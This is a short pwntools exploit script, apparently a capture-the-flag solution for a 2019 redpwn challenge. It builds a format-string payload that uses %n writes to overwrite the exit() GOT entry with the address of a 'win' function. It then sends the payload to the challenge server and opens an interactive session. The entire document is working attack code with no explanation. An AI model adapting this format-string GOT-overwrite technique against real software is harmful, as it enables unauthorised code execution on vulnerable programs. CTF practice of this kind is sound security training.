from pwn  import *

WIN = 0x8048737
EXIT_GOT = 0x804a020

def pad(s):
	return s + 'B' * (500 - len(s))

exploit = ''
exploit += p32(EXIT_GOT)
exploit += p32(EXIT_GOT + 2)
exploit += '%7$34606x '
exploit += '%7$n '
exploit += '%8$32971x '
exploit += '%8$n '
print(exploit)
p = remote('chall.2019.redpwn.net', 4003)
p.sendline(pad(exploit))
p.interactive()
